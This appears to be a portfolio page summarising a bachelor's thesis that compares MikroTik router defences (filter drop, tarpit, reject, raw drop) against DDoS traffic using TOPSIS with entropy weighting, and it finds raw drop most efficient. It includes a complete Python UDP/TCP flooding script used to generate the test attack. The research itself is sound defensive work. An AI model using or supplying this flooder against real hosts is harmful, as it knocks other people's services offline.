---
title: Security Method Analysis on Mikrotik
desc: This research demonstrates that using raw rules provides better performance compared to filter rules in Mikrotik. The evaluation was conducted using the TOPSIS multi-criteria decision-making method.
images: ['/skripsi.png']
size: w-32 sm:max-w-screen-xl
tools: [
    {imagePath: '/python.svg', alt: 'Python'},
    {imagePath: '/mikrotik.svg', alt: 'Mikrotik'},
    {imagePath: '/figma.svg', alt: 'Figma'},
    {imagePath: '/canva.svg', alt: 'Canva'},
]
tags: ['self', 'network']
---

# **Security Method Analysis on Mikrotik**
This research demonstrates that using raw rules provides better performance compared to filter rules in Mikrotik. The evaluation was conducted using the TOPSIS multi-criteria decision-making method.

## **How it Works?**

![Topsis-Entropy](/skripsi2.png)
The topology is: there are server / internal network to be defended by Mikrotik Router. All of the traffic from outside is filtered through Mikrotik, I ignore the use of Honeypot at DMZ, because it is using external power from Mikrotik. So the focused is using all the feature inside Mikrotik like filter rule drop, tarpit, reject and raw drop.
![Topsis-Entropy](/topsis.png) I recorded all of the data starting from CPU Load, Memory Usage, and Traffic when I launch a DDoS Attack. After gather all the data I input it to the TOPSIS algorithm using entropy weight.
![Results](/skripsi3.png) So the best, efficient, and effective method are the Raw Drop method.


![Skripsi Image](/skripsi.png)

### DDoS Python
```
import socket
import random
import threading
ip = ''
port = 80
#port = random.randint(80,443)
jp = 65500
thread = 5
#jp = jumlah paket
def serang_udp(ip,port,jp,thread):
    data = bytes(1024)
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                for x in range(jp):
                    for ulang in ip:
                        s.sendto(data,(str(ulang),int(port)))
            except:
                print('gagal')
def serang_tcp(ip,port,jp,thread):
    data = bytes(1024)
    print(f"tcp dijalankan pada{ip}:{port}")
    while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port)) #hand shake
                for x in range(jp):
                  s.send(data)
                  print(s.send(data))
            except:
                s.close()
                #print('gagal')

def pilih(c):
    for i in range(thread):
        th = threading.Thread(target=serang_tcp(ip,port,jp,i) if c==2 else serang_udp(ip,port,jp,i))
        th.start()
pilih(c=int(input("Masukan 1 untuk udp, 2 untuk tcp:\nInput: ")))
```

## Explore This Project

Take a Look @ My Lovely [Bachelor's Thesis](/skripsiHeru.pdf). This is not my enchanced version, the enchanced version is in english and more simple.